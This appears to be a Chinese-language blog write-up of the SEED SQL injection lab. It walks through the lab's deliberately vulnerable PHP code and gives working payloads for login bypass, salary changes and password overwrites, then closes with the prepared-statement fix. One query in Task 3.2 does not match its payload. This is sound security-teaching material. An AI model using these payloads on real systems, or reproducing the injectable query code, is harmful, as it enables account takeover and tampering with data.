---
title: 软件安全-SQL注入
date: 2026-04-17
categories: Web安全
toc: true 
---



SQL 注入是一种通过在输入字段中插入恶意SQL代码，操控数据库执行非预期操作的攻击手段。通过SQL注入，攻击者不仅可以窃取数据，还可以在某些情况下插入数据到目标数据库。

本实验探索利用 SQL 注入漏洞的方法，展示此类攻击可能造成的危害，并掌握防御该攻击的技术。



<!--more-->

- SQL statements: SELECT and UPDATE statements
- SQL injection
- Prepared statement



## 环境搭建

下载 `Labsetup-SQL` 

```bash
$ dcbuild
$ dcup
# 关闭实验环境
$ dcdown
```

![image-20260417000514914](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/1.png)



## 实验内容

### Task 1 - Get Familiar with SQL Statements

```bash
mysql -u root -p
eed@VM:~$ dockps
d46b777d56c9  www-10.9.0.5
04ddc7f024ff  mysql-10.9.0.6
[04/16/26]seed@VM:~$ docksh 04ddc7f024ff
root@04ddc7f024ff:/# mysql -u root -p
# 输入密码 dees
```

要求打印 Alice  的信息

```sql
SELECT * FROM credential WHERE Name = "Alice";
```

![image-20260417001328337](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/2.png)



### Task 2 - SQL Injection Attack on SELECT Statement

先分析登录逻辑：

```php
$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
				nickname, Password
		FROM credential
		WHERE name= '$input_uname' and Password='$hashed_pwd'";
$result = $conn -> query($sql);

// The following is Pseudo Code
if(id != NULL) {
	if(name=='admin') {
		return All employees information;
	} else if (name !=NULL){
	return employee information;
}
} else {
	Authentication Fails;
}
```

#### Task 2.1

> Your task is to log into the web application as the
> administrator from the login page, so you can see the information of all the employees. We assume that
> you do know the administrator’s account name which is admin, but you do not the password. You need to
> decide what to type in the Username and Password fields to succeed in the attack.

要以管理员登录：

```sql
SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
FROM credential
WHERE name= '$input_uname' and Password='$hashed_pwd';
```

提前闭合`'`，然后注释掉后面的部分即可

```sql
-- 用户名字段(注意后面要有空格)
admin' -- 
```

```sql
SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
FROM credential
WHERE name= 'admin' -- ' and Password='$hashed_pwd';
```

![image-20260417002204427](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/3.png)



#### Task 2.2

使用命令行重复任务 Task 2.1

```bash
curl 'http://www.seed-server.com/unsafe_home.php?username=admin%27%20--%20&Password='
```

![image-20260417003930874](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/4.png)





#### Task 2.3

通过登录页面执行两条SQL语句，已知存在一项防护措施

```sql
admin'; UPDATE credential SET Salary = 80000 WHERE Name = 'Alice'  -- 
```

替换掉之前的输入内容：

```sql
SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
FROM credential
WHERE name= 'admin'; UPDATE credential SET Salary = 80000 WHERE Name = 'Alice'  -- ' and Password='$hashed_pwd';
```

markdown 的代码块已经成功注释掉后面部分，但是尝试登录时报错：

![image-20260417003413918](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/5.png)

这应该就是说到的防护措施

Seed book 中说明：

```
Such an attack does not work against MySQL, because in PHP's mysqli extension, the mysqli::query () API does not allow multiple queries to run in the database server. This is due to the concern of SQL injection.

It should be noted that the MySQL database server does allow multiple SQL statements to be included in one statement string. If we do want to run multiple SQL statements, we can use $mysqli -> multLquery () . For the sake of security, we should avoid using this API in our code, especially if the SQL statement string contains untrusted data. 
```

对应登录校验逻辑：

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
				nickname, Password
		FROM credential
		WHERE name= '$input_uname' and Password='$hashed_pwd'";
$result = $conn -> query($sql);
```

这里 query 只能执行一条 SQL 语句，使用 multLquery 才能执行多条 SQL 语句





### Task 3 - SQL Injection Attack on UPDATE Statement

基于更新个人资料，实现 SQL 注入

先查看修改个人资料的逻辑：

```php
<!DOCTYPE html>
<html>
<body>

  <?php
  session_start();
  $input_email = $_GET['Email'];
  $input_nickname = $_GET['NickName'];
  $input_address= $_GET['Address'];
  $input_pwd = $_GET['Password'];
  $input_phonenumber = $_GET['PhoneNumber'];
  $uname = $_SESSION['name'];
  $eid = $_SESSION['eid'];
  $id = $_SESSION['id'];

  function getDB() {
    $dbhost="10.9.0.6";
    $dbuser="seed";
    $dbpass="dees";
    $dbname="sqllab_users";
    // Create a DB connection
    $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
    if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error . "\n");
    }
    return $conn;
  }

  $conn = getDB();
  // Don't do this, this is not safe against SQL injection attack
  $sql="";
  if($input_pwd!=''){
    // In case password field is not empty.
    $hashed_pwd = sha1($input_pwd);
    //Update the password stored in the session.
    $_SESSION['pwd']=$hashed_pwd;
    $sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;";
  }else{
    // if passowrd field is empty.
    $sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;";
  }
  $conn->query($sql);
  $conn->close();
  header("Location: unsafe_home.php");
  exit();
  ?>

</body>
</html>
```



#### Task 3.1 Modify your own salary

```php
$sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;";
```

nickname 字段：

```
alice', Salary= '80000
```

```sql
UPDATE credential SET nickname='alice', Salary= '80000',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;
```



修改成功：从 20000 变成 80000

![image-20260417010959539](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/6.png)



#### Task 3.2 Modify other people’ salary

> After increasing your own salary, you decide to punish your boss Boby. You want to reduce his salary to 1 dollar. Please demonstrate how you can achieve that.

```php
$sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;";
```

条件需要修改为 Name = 'Boby'

```
Boby', Salary= 1 WHERE Name = 'Boby'; -- 
```

```sql
UPDATE credential SET nickname='alice', Salary= 80000 WHERE Name = 'Boby'; -- ',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;
```

![image-20260417013019586](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/7.png)

此时 Boby 的 Salary 列 为 1，修改成功



#### Task 3.3 Modify other people’ password

修改 Boby 的密码

```php
  $sql="";
  if($input_pwd!=''){
    // In case password field is not empty.
    $hashed_pwd = sha1($input_pwd);
    //Update the password stored in the session.
    $_SESSION['pwd']=$hashed_pwd;
    $sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;";
```

Password 会经过 sha1 哈希，那就依旧修改 nickname

已知 sha1(123456) = 7c4a8d09ca3762af61e59520943dc26494f8941b

```
Boby', Password = '7c4a8d09ca3762af61e59520943dc26494f8941b' WHERE Name = 'Boby'; -- 
```

```sql
UPDATE credential SET nickname='Boby', Password = '7c4a8d09ca3762af61e59520943dc26494f8941b' WHERE Name = 'Boby'; -- ',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;
```

![image-20260417013756792](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/8.png)

修改成功，尝试使用 Boby-123456 登录也成功



### Task 4 - Countermeasure — Prepared Statement

使用另一个 URL `seed-server.com/defense`

先查看该 URL 对应登录校验逻辑：

```php
<?php
// Function to create a sql connection.
function getDB() {
  $dbhost="10.9.0.6";
  $dbuser="seed";
  $dbpass="dees";
  $dbname="sqllab_users";

  // Create a DB connection
  $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error . "\n");
  }
  return $conn;
}

$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

// create a connection
$conn = getDB();

// do the query
$result = $conn->query("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name= '$input_uname' and Password= '$hashed_pwd'");
if ($result->num_rows > 0) {
  // only take the first row 
  $firstrow = $result->fetch_assoc();
  $id     = $firstrow["id"];
  $name   = $firstrow["name"];
  $eid    = $firstrow["eid"];
  $salary = $firstrow["salary"];
  $ssn    = $firstrow["ssn"];
}

// close the sql connection
$conn->close();
?>
```

使用预编译防止字段注入：

```php
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name= ? and Password= ? ");
if ($stmt) {
    $stmt->bind_param("ss", $input_uname, $hashed_pwd);
    $stmt->execute();
    $stmt->store_result();  // 存储结果集，以便获取行数
    
    if ($stmt->num_rows > 0) {
        // 绑定结果到变量
        $stmt->bind_result($id, $name, $eid, $salary, $ssn);
        $stmt->fetch();
        $found = true;
    }
}
```

测试使用预编译前后 SQL 注入：

```sql
-- 和 Task2 一样登录
admin' -- 
```

使用预编译前：成功查询到 Admin 信息

![image-20260417015739321](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/9.png)

使用预编译后：查询不到数据

![image-20260417015649981](../assets/img/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/10.png)



